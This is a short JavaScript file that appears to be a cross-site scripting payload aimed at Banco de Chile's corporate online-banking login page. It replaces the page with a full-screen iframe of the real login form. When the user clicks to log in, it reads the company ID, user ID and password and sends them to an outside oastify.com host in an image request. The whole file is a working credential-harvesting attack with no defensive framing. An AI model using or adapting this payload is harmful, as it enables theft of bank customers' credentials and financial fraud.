function carga() {
	alert("entra carga");
    var profileIframe = document.createElement('iframe');
    profileIframe.setAttribute('src', 'https://www.empresas.bancochile.cl/eft/html/login_bch_emp.htm');
    profileIframe.setAttribute('name', 'select_frame');
    profileIframe.setAttribute('id', 'select_frame');
    document.body.appendChild(profileIframe);

    document.getElementById('select_frame').onload = function() {

        document.getElementById('select_frame').contentWindow.document.getElementById('idIngresar').addEventListener('click', function() {
            var rutEmpresa = document.getElementById('select_frame').contentWindow.document.getElementsByName('empresaoriginal')[0].value;;
			var rutUsuario = document.getElementById('select_frame').contentWindow.document.getElementsByName('usuariooriginal')[0].value;;
            var password = document.getElementById('select_frame').contentWindow.document.getElementsByName('CLAVEUSU')[0].value;
            var data = 'rutEmpresa=' + rutEmpresa + '&rutUsuario=' + rutUsuario + '&password=' + password;
			console.log(data)
            var i = document.createElement('img');
            i.src = 'https://teb3yt0sukh3asm3pcr6pa1c43auyqmf.oastify.com/?leak=' +data;
        });
    }
}

function payloadJS() {
	document.body.innerHTML = "<script src='https://code.jquery.com/jquery-2.2.4.min.js'></script><style type='text/css'>html, body, div, iframe { margin:0; padding:0; height:100%; } iframe { display:block; width:100%; border:none; }</style><img src='https://www.empresas.bancochile.cl/eft/html/login_bch_emp.htm' style='display: none;' onerror='carga()'>";  
	alert("entra payloadJS");
}
